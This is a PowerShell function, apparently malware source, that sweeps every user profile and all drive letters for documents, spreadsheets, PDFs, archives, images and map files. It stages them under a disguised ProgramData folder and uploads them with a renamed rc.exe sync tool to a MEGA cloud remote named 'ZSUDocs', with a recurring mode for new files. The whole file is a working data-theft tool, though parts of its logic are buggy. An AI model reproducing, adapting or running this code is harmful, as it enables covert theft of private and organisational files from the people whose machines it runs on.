function Invoke-StreamCopy {
param (
    [switch]$First,
    [switch]$Stream,
    [switch]$DownAll,
    [string]$objName,
    [string]$destMega
)


    function SearchAndCopy {
    param (
        [string]$LocalPath,
        [string]$WhichCopy
    )
    
        $files = (Get-ChildItem -Path $LocalPath -Recurse -Include $exts -Exclude "~$*") | Where-Object {$_.Length -lt $size}
        if ($WhichCopy = 'Stream') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-200) } }
        if ($WhichCopy = 'First') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-500) } }
    
        foreach ($file in $files) {         
            $num = 1
            $tempDestDir = ($destDir + 'tempDir\'); New-Item $tempDestDir -ItemType Directory -ea 0
            Copy-Item -Force $file.FullName $tempDestDir
            $newFile = ($tempDestDir + $file.Name)

            $hash = (Get-FileHash -Algorithm MD5 $newFile).hash
            if ((Select-String -path $hashfile -Pattern $hash) -eq $null) {
                $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
                if ($WhichCopy = 'First') {
                    Move-Item -Force $newFile.FullName -Destination $allDestDir
                }
                if ($WhichCopy = 'Stream') {
                    New-Item $sendDestDir -ItemType Directory -ea 0 
                    Move-Item -Force $newFile.FullName -Destination $sendDestDir
                }
                    
                $hash | Out-File -Encoding utf8 -FilePath $sucup -Append
            } else { 
                ($file.FullName + " : --- OLD FILE ---") | Out-File -Encoding utf8 -FilePath $logfile -Append
                del -Force $newFile
            }
        }
        del -Recurse -Force $tempDestDir
    }


    function Secure-Copy {
    param (
        [string]$WhichCopy
    )
        
        foreach ($usersDir in (gci $srcdir)) {
            foreach ($deskDir in $deskDirs) { 
                SearchAndCopy -LocalPath (Join-Path $usersDir.FullName $deskDir) -WhichCopy $WhichCopy 
            }
        }
        foreach ($allPath in $allPaths) { 
            if (Test-Path -Path $allPath) {
                SearchAndCopy -LocalPath $allPath -WhichCopy $WhichCopy 
            }
        }
    }


    [bool]$second = $false
    $baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
    $appsDir = $baseDir + 'Apps\'; New-Item $appsDir -ItemType Directory -ea 0
    $srcdir = 'C:\Users\'
    $allPaths = @('A:','B:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','T:','U:','V:','W:','Z:','X:','Y:')
    $destDir = ($baseDir + 'Docs\') ; New-Item $destDir -ItemType Directory -ea 0
    $sucup = ($destDir + 'sucup.txt'); del -force $sucup; New-Item $sucup -ItemType File -ea 0

    $allDestDir = ($destDir + 'ALL\'); New-Item $allDestDir -ItemType Directory -ea 0
    $hashfile = ($destDir + 'checksum.txt') ;New-Item $hashfile -ItemType File -ea 0
    $logfile = ($destDir + 'logs.txt'); New-Item $logfile -ItemType File -ea 0

#$currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
    $currDate = (Get-Date -UFormat %d.%m.%y)
    $currYear = (Get-Date -UFormat %Y)
    $size = 100*1024*1024
    $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*.kme','*.kml','*.kmz','*.scene','*.json','*zones.txt','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
    $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')

    if ($objName -eq "") { $objName = $env:COMPUTERNAME }

    if ($destMega -eq "") { $destMega = "ZSUDocs" }

    if (($First -ne $true) -and ($Stream -ne $true) -and ($DownAll -ne $true)) {
        echo "You must specify at least one of <First> or <Stream> or <DownAll>"
        return
    }

    if ($Stream -OR $First) { 
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
        $CurrDateTime | Out-File -Encoding utf8 -FilePath $logfile -Append
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
    }

    if ($First) {
        Secure-Copy -WhichCopy First
        echo "Upload Documents . . ." 
        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
        Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
        del -force $sucup
    }

    if ($DownAll) {
        echo "Upload Documents . . ." 
        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
        Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
        del -force $sucup
    }
    
    if ($Stream) {
        $etalonhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
        $sendDestDir = ($destDir + $currYear + '\' + $currDate)
        
        Secure-Copy -WhichCopy Stream

        $newhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
        if ($newhash -ne $etalonhash) {
            echo "Upload Documents . . ."
            &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
            Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
            del -force $sucup
        }
    }
}